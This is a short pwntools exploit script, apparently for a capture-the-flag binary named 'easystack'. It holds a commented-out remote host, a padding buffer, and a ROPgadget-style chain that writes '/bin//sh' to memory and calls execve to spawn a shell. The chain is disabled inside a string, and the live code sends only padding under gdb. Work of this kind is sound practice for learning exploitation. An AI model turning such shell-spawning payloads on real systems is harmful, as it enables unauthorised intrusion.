from pwn import *
from struct import pack
io = process("./easystack")
#io = remote("node2.hackingfor.fun","32212")
# Padding goes here
p = "a" *0x60 
'''
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb080) # @ .data
p += pack('<Q', 0x000000000041ff24) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000474d61) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x0000000000426b7f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474d61) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004016b6) # pop rdi ; ret
p += pack('<Q', 0x00000000006cb080) # @ .data
p += pack('<Q', 0x00000000004017d7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x00000000004433c6) # pop rdx ; ret
p += pack('<Q', 0x00000000006cb088) # @ .data + 8
p += pack('<Q', 0x0000000000426b7f) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004673b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004003da) # syscall
'''
#io.sendafter("answer!!",p)

io.sendafter("answer!!",p)

gdb.attach(io)
pause()

io.interactive()
